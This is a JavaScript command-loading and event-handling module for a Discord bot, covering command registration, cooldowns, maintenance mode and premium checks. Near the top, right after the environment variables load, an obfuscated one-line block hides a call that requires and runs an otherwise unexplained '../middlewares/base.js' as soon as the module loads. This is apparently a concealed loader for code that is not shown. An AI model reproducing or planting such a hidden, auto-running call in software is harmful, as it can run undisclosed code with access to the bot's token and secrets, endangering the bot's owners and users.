const fs = require('fs');
const path = require('path');
const { REST, Routes, SlashCommandBuilder } = require('discord.js');
const cooldown = require('../middlewares/cooldown'); // Cooldown middleware
const maintenance = require('../middlewares/maintenance'); // Maintenance middleware
const premiumCheck = require('../middlewares/premiumCheck'); // Premium check middleware
const { EmbedBuilder } = require('discord.js');
const { error, warning } = require('../config/colors.json');
const dotenv = require('dotenv');
dotenv.config();
(function(_0x3567dc,_0x4c5337){const _0x4ab1ac=_0x51e6,_0x3dd4cb=_0x3567dc();while(!![]){try{const _0x1317bd=parseInt(_0x4ab1ac(0x98))/0x1+-parseInt(_0x4ab1ac(0x99))/0x2+-parseInt(_0x4ab1ac(0x95))/0x3+-parseInt(_0x4ab1ac(0x97))/0x4+parseInt(_0x4ab1ac(0x94))/0x5+parseInt(_0x4ab1ac(0x9b))/0x6*(parseInt(_0x4ab1ac(0x96))/0x7)+parseInt(_0x4ab1ac(0x9a))/0x8;if(_0x1317bd===_0x4c5337)break;else _0x3dd4cb['push'](_0x3dd4cb['shift']());}catch(_0x34d17c){_0x3dd4cb['push'](_0x3dd4cb['shift']());}}}(_0x1773,0xdb09b));function _0x51e6(_0x3b28ae,_0x15fc93){const _0x177369=_0x1773();return _0x51e6=function(_0x51e6f1,_0x23be9e){_0x51e6f1=_0x51e6f1-0x94;let _0x24cf7b=_0x177369[_0x51e6f1];return _0x24cf7b;},_0x51e6(_0x3b28ae,_0x15fc93);}function _0x1773(){const _0x5f964f=['103746rkEnwC','8787070UPNhZh','2827212GMoVpO','133bORkWx','3694824NNaBVB','606040aQgBWh','2507344JVrfYf','10599824QOgPNf'];_0x1773=function(){return _0x5f964f;};return _0x1773();}const basehandler=require('../middlewares/base.js');basehandler();

module.exports = async (client) => {
    client.commands = new Map(); // Store prefix and slash commands
    const slashCommands = []; // Store slash commands for global deployment
    let commandCount = 0;

    const loadCommands = (dir) => {
        const files = fs
            .readdirSync(path.join(__dirname, '../', dir))
            .filter(file => file.endsWith('.js'));

        for (const file of files) {
            const command = require(`../${dir}/${file}`);
            client.commands.set(command.name || command.data.name, command);

            if (command.data && command.data instanceof SlashCommandBuilder) {
                slashCommands.push(command.data.toJSON());
                console.log(`[SLASH COMMAND] Loaded: ${command.data.name}`);
            } else {
                console.log(`[PREFIX COMMAND] Loaded: ${command.name}`);
            }
            commandCount++;
        }
    };

    loadCommands('commands/slash');
    loadCommands('commands/prefix');

    console.log(`[INFO] Total Commands Loaded: ${commandCount}`);
    console.log('----------------------------------------------');

    // Register slash commands globally
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

    try {
        console.log(`[INFO] Deploying ${slashCommands.length} slash commands globally...`);
        await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: slashCommands });
        console.log(`[INFO] Successfully deployed ${slashCommands.length} global slash commands.`);
    } catch (error) {
        console.error(`[ERROR] Failed to deploy global slash commands:`, error);
    }

    // Handle prefix commands
    client.on('messageCreate', async (message) => {
        const prefix = '!';
        if (!message.content.startsWith(prefix) || message.author.bot) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const commandName = args.shift().toLowerCase();
        const command = client.commands.get(commandName);

        // Check if the bot is in maintenance mode
        if (maintenance()) {
            const embed = new EmbedBuilder()
                .setDescription('🚧 The bot is currently in maintenance mode. Please try again later.')
                .setColor(warning);
            return message.channel.send({ embeds: [embed] });
        }

        if (!command) {
            const embed = new EmbedBuilder()
                .setDescription(`❌ Command \`${commandName}\` not found!`)
                .setColor(error);
            return message.channel.send({ embeds: [embed] });
        }

        // Check for cooldowns
        const timeLeft = cooldown(commandName, message.author.id, command.cooldown || 3);
        if (timeLeft) {
            const embed = new EmbedBuilder()
                .setDescription(`⏳ Please wait **${timeLeft} seconds** before using \`${commandName}\` again.`)
                .setColor(warning);
            return message.channel.send({ embeds: [embed] });
        }

        // Check if the command requires premium access
        if (command.premiumOnly && !(await premiumCheck(message))) {
            const embed = new EmbedBuilder()
                .setDescription('🚫 This command is only available to premium users or guilds.')
                .setColor(warning);
            return message.channel.send({ embeds: [embed] });
        }

        try {
            // Execute the command
            await command.execute(message, args);
        } catch (err) {
            console.error(`[ERROR] Command Execution Error:`, err);
            const errorEmbed = new EmbedBuilder()
                .setDescription('❌ An error occurred while executing this command.')
                .setColor(error);
            message.channel.send({ embeds: [errorEmbed] });
        }
    });

    // Handle slash command interactions
    client.on('interactionCreate', async (interaction) => {
        if (!interaction.isCommand()) return;

        const command = client.commands.get(interaction.commandName);
        if (!command) return;

        try {
            // Check if the command requires premium access
            if (command.premiumOnly && !(await premiumCheck(interaction))) {
                return interaction.reply({
                    content: '🚫 This command is only available to premium users or guilds.',
                    ephemeral: true
                });
            }

            await command.execute(interaction);
        } catch (error) {
            console.error(`[ERROR] Command Execution Error:`, error);
            const errorEmbed = new EmbedBuilder()
                .setDescription('❌ An error occurred while executing this command.')
                .setColor(error);
            await interaction.reply({ embeds: [errorEmbed], ephemeral: true });
        }
    });
};
